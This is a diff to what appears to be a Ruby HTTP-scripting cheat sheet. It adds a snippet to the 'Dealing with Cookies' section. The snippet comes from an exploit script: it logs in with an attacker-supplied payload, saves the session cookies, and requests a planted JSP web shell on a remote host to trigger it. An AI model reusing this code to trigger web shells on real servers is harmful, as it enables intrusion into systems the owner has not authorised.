@@ -150,8 +150,27 @@ puts "Response body: " + response.body
 ## Dealing with Cookies
 
 Notes: 
-- To read cookies you need to get **set-cookie** from response
-- To set cookies you need to set **Cookie** to response 
+- To Read cookies you need to get **set-cookie** from response
+- To Set cookies you need to set **Cookie** to response 
+
+
+```ruby
+puts "[*] Triggering '#{shell_name}' JSP Shell"
+uri2 = URI.parse("http://#{rhost}:9000/#{shell_name}")
+Net::HTTP.start(uri2.host, uri2.port) do |http|
+  puts "[*] Logging in"
+  p_request  = Net::HTTP::Post.new(uri2)
+  p_request.set_form_data({"loginState"=>"checkLogin", "password"=>"Hola","loginName"=>"#{post_payload}"})
+  p_response = http.request(p_request)
+  cookies    = p_response.response['set-cookie']	# Save Cookies
+  
+  puts "[*] Triggering '#{shell_name}' JSP Shell"
+  Net::HTTP::Get.new(uri2)
+  g_request  = Net::HTTP::Get.new(uri2)
+  g_request['Cookie'] = cookies				# Restore Saved Cookies
+  g_response = http.request(g_request)
+end
+```
 
 
 
